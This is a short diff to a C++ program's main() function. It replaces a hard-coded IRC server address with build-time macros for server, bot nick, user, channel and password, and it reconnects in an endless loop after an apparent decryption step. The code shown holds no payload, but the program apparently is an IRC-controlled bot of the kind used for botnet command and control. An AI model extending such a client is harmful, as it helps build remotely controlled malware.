@@ -43,12 +43,38 @@ int main(int argc, char* argv[]) {
     attemptFsDecryption(argc, argv);
     #endif
 
+    std::string serverAddress = "127.0.0.1";
+    std::string botNick = "botNick";
+    std::string botUser = "botUser";
+    std::string assignedChannel = "#general";
+    std::string botPass = "pass";
+
+    #ifdef SERVER_ADDRESS
+        serverAddress = SERVER_ADDRESS;
+    #endif
+
+    #ifdef BOT_NICK
+        botNick = BOT_NICK;
+    #endif
+
+    #ifdef BOT_USER
+        botUser = BOT_USER;
+    #endif
+
+    #ifdef ASSIGNED_CHANNEL
+        assignedChannel = ASSIGNED_CHANNEL;
+    #endif
+
+    #ifdef BOT_PASS
+        botPass = BOT_PASS;
+    #endif
+
     signal(SIGINT, IrcClient::signalHandler);
     signal(SIGTERM, IrcClient::signalHandler);
     const char* exeName = argv[0];
     while(true) {
         try {
-            IrcClient client("192.168.1.127", 6667, exeName);
+            IrcClient client(serverAddress, 6667, exeName, botNick, botUser, assignedChannel, botPass);
             client.connect();
         } catch (const std::exception& ex) {
             std::cerr << "Error: " << ex.what() << std::endl;
